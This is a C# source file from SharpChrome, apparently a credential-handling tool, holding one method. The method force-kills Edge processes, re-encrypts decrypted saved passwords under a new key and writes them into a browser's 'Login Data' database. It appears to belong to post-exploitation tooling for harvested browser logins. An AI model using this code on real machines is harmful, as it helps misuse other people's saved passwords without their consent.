using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using SharpChrome.Extensions;
using SQLite;

namespace SharpChrome
{
    internal partial class Chrome
    {
        /// <summary>
        /// Write a bunch of <see cref="logins"/> to a 'Login Data' database in a given directory.
        /// </summary>
        /// <param name="targetDirectory"></param>
        /// <param name="logins"></param>
        /// <param name="browser"></param>
        /// <param name="newAesStateKey"></param>
        public static void WriteLocalChromiumLogins(string targetDirectory, IEnumerable<logins> logins,
            Browser browser = Browser.Chrome,
            byte[] newAesStateKey = null)
        {
            if (browser == Browser.Edge) {
                var edgeProcesses = Process.GetProcessesByName("msedge");
                edgeProcesses.TryKillProcesses();
                edgeProcesses = Process.GetProcessesByName("msedge");
                if (edgeProcesses.Any()) {

                }
            }

            var dbPath = browser.ResolveLoginDataPath(targetDirectory);
            var uri = new Uri(dbPath);
            // string loginDataFilePathUri = $"{uri.AbsoluteUri}";
            string loginDataFilePathUri = dbPath;
            SQLiteConnection database = null;

            List<logins> loginList = logins.ToList();

            List<logins> loginsWithoutDecryptedPassword = loginList
                .Where(l => string.IsNullOrEmpty(l.DecryptedPasswordValue))
                .ToList();

            List<logins> loginsWithDecryptedPasswords = loginList.Except(loginsWithoutDecryptedPassword).ToList();

            if (loginsWithDecryptedPasswords.Count == 0)
                throw new Exception("Nothing to write! Need a sequence of logins that have decrypted password values.");

            if (newAesStateKey != null) {
                loginsWithDecryptedPasswords = loginsWithDecryptedPasswords.ReEncryptPasswords(newAesStateKey);
            }

            using (database = new SQLiteConnection(loginDataFilePathUri,
                       SQLiteOpenFlags.ReadWrite, false)) {
                foreach (var login in loginsWithDecryptedPasswords) {
                    database.InsertOrReplace(login);
                }
            }
        }
    }
}